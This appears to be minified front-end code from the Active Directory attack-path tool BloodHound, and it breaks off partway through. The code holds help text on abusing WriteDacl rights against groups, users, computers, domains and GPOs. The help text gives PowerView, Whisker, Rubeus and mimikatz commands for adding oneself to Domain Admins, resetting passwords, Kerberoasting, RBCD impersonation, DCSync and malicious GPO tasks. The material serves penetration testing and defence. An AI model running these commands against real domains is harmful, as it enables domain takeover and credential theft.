noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=netframework-4.8",children:"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=netframework-4.8"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/addmember",children:"https://www.thehacker.recipes/ad/movement/dacl/addmember"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting",children:"https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/group-policies",children:"https://www.thehacker.recipes/ad/movement/group-policies"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword",children:"https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials",children:"https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync",children:"https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd",children:"https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights",children:"https://www.thehacker.recipes/ad/movement/dacl/grant-rights"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/eladshamir/Whisker",children:"https://github.com/eladshamir/Whisker"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab",children:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://decoder.cloud/2023/11/20/a-deep-dive-in-cert-publishers-group/",children:"https://decoder.cloud/2023/11/20/a-deep-dive-in-cert-publishers-group/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53",children:"https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword",children:"https://learn.microsoft.com/en-us/powershell/module/laps/get-lapsadpassword"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt",children:"https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/CravateRouge/bloodyAD",children:"https://github.com/CravateRouge/bloodyAD"})]}),Ub=({sourceName:r,sourceType:a,targetName:o,targetType:i,targetId:s,haslaps:c})=>{switch(i){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a group object, you may grant yourself the AddMember permission. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:'Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers'}),e.jsx(t,{variant:"body2",children:"You can now add members to the group using the net binary or PowerView's Add-DomainGroupMember."}),e.jsx(t,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember permission. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),e.jsxs(t,{variant:"body2",children:["To abuse this permission with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),e.jsx(t,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"}),e.jsx(t,{variant:"body2",children:"Cleanup for this can be done using Remove-DomainObjectAcl"}),e.jsx(t,{component:"pre",children:'Remove-DomainObjectAcl -Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers'})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a user object, you may grant yourself the GenericAll permission. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All"}),e.jsxs(t,{variant:"body2",children:["The GenericAll permission grants ",r," the ability to change the password of the user"," ",o,' without knowing their current password. This is equivalent to the "ForceChangePassword" edge in BloodHound.']}),e.jsxs(t,{variant:"body2",children:["GenericAll also grants ",r,' the permission to write to the "msds-KeyCredentialLink" attribute of ',o,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the "AddKeyCredentialLink" edge.']}),e.jsxs(t,{variant:"body2",children:["Alternatively, GenericAll enables ",r," to set a ServicePrincipalName (SPN) on the targeted user, which may be abused in a Targeted Kerberoast attack."]}),e.jsx(t,{variant:"body1",children:" Force Change Password attack "}),e.jsx(t,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword permission. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),e.jsxs(t,{variant:"body2",children:["To abuse this permission with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),e.jsx(t,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),e.jsxs(t,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsx(t,{variant:"body2",children:"To abuse the permission, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user/computer`:`a member of ${r} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast attack "}),e.jsx(t,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),e.jsx(t,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),e.jsx(t,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"})]});case"Computer":return c?e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a computer object, you may grant yourself the GenericAll permission."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),e.jsxs(t,{variant:"body2",children:["The GenericAll permission grants ",r," the ability to obtain the LAPS (RID 500 administrator) password of ",o,"."]}),e.jsxs(t,{variant:"body2",children:["GenericAll also grants ",r,' the permission to write to the "msds-KeyCredentialLink" attribute of ',o,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the "AddKeyCredentialLink" edge.']}),e.jsx(t,{variant:"body2",children:"Alternatively, GenericAll on a computer object can be used to perform a Resource-Based Constrained Delegation attack."}),e.jsx(t,{variant:"body1",children:" Retrieve LAPS Password "}),e.jsxs(t,{variant:"body2",children:["For systems using legacy LAPS, the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwd"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwdExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{})]}),e.jsxs(t,{variant:"body2",children:["For systems using Windows LAPS (2023 edition), the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-Password"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-PasswordExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPassword"}),": The encrypted LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPasswordHistory"}),": The encrypted LAPS password history",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPassword"}),": The encrypted Directory Services Restore Mode (DSRM) password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPasswordHistory"}),": The encrypted DSRM password history",e.jsx("br",{})]}),e.jsx(t,{variant:"body2",children:"Plaintext attributes can be read using a simple LDAP client. For example, with PowerView:"}),e.jsx(t,{component:"pre",children:'Get-DomainComputer "MachineName" -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"'}),e.jsx(t,{variant:"body2",children:"Encrypted attributes can be decrypted using Microsoft's LAPS PowerShell module. For example:"}),e.jsx(t,{component:"pre",children:'Get-LapsADPassword "WIN10" -AsPlainText'}),e.jsxs(t,{variant:"body2",children:["The encrypted attributes can also be retrieved and decrypted using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt",children:"lapsv2decrypt"})," ","(dotnet or BOF)."]}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsx(t,{variant:"body2",children:"To abuse the permission, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user/computer`:`a member of ${r} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation attack "}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a computer object, you may grant yourself the GenericAll permission."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),e.jsxs(t,{variant:"body2",children:["The GenericAll grants ",r,' the permission to write to the "msds-KeyCredentialLink" attribute of ',o,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the "AddKeyCredentialLink" edge.']}),e.jsx(t,{variant:"body2",children:"Alternatively, GenericAll on a computer object can be used to perform a Resource-Based Constrained Delegation attack."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsx(t,{variant:"body2",children:"To abuse the permission, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user/computer`:`a member of ${r} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation attack "}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]});case"Domain":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a domain object, you may grant yourself DCSync permissions."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),e.jsx(t,{variant:"body2",children:"Once you have granted yourself this permission, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain"}),e.jsx(t,{component:"pre",children:"lsadump::dcsync /domain:testlab.local /user:Administrator"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync"}),e.jsx(t,{variant:"body2",children:"Alternatively, you can grant GenericAll on the domain and execute one of the follwing attacks."}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:"The simplest and most straight forward way to obtain control of the objects of the domain is to apply a GenericAll ACE on the domain that will inherit down to all object types. This can be done using PowerView. This time we will use the New-ADObjectAccessControlEntry, which gives us more control over the ACE we add to the domain object."}),e.jsx(t,{variant:"body2",children:"Next, we will fetch the GUID for all objects. This should be '00000000-0000-0000-0000-000000000000':"}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name`}),e.jsx(t,{variant:"body2",children:'Then we will construct our ACE. This command will create an ACE granting the "JKHOLER" user full control of all descendant objects:'}),e.jsx(t,{component:"pre",children:"$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity 'JKOHLER' -Right GenericAll -AccessControlType Allow -InheritanceType All -InheritedObjectType $AllObjectsPropertyGuid"}),e.jsx(t,{variant:"body2",children:"Finally, we will apply this ACE to the domain:"}),e.jsx(t,{component:"pre",children:`$DomainDN = "DC=dumpster,DC=fire"
$dsEntry = [ADSI]"LDAP://$DomainDN"
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:`If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. You could, for example, grant a user "ForceChangePassword" permission against all user objects, or grant a security group the ability to read every GMSA password under a certain OU. Below is an example taken from PowerView's help text on how to grant the "ITADMIN" user the ability to read the LAPS password from all computer objects in the "Workstations" OU:`}),e.jsx(t,{component:"pre",children:`$Guids = Get-DomainGUIDMap
$AdmPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'ms-Mcs-AdmPwd'} | select -ExpandProperty name
$CompPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'Computer'} | select -ExpandProperty name
$ACE = New-ADObjectAccessControlEntry -Verbose -PrincipalIdentity itadmin -Right ExtendedRight,ReadProperty -AccessControlType Allow -ObjectType $AdmPropertyGuid -InheritanceType All -InheritedObjectType $CompPropertyGuid
$OU = Get-DomainOU -Raw Workstations
$DsEntry = $OU.GetDirectoryEntry()
$dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
$dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
$dsEntry.PsBase.CommitChanges()`}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"The compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any user or computer with inheritance disabled, including objects located in nested OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on a domain object through an alternative attack vector. Indeed, with GenericAll permissions over a domain object, you may make modifications to the gPLink attribute of the domain. The ability to alter the gPLink attribute of a domain may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the domain user and computer objects (including the ones located in nested OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a domain-joined compromised Windows machine, the gPLink manipulation attack vector may be exploited through Powermad, PowerView and native Windows functionalities. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://labs.withsecure.com/publications/ou-having-a-laugh",children:"this article"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given domain as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of a domain can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target domain through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"GPO":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To abuse WriteDacl to a GPO object, you may grant yourself the GenericAll permission."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"}),e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse"}),e.jsx(t,{variant:"body2",children:"Cleanup can be done using the Remove-DomainObjectAcl function:"}),e.jsx(t,{component:"pre",children:"Remove-DomainObjectAcl -Credential $Cred -TargetIdentity TestGPO -Rights All"})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body1",children:"Control of the Organizational Unit"}),e.jsx(t,{variant:"body2",children:"With WriteDACL access on the OU object, you may grant yourself GenericAll against the OU, and then set another ACE on the OU that will inherit down to its descendent objects. First, you will 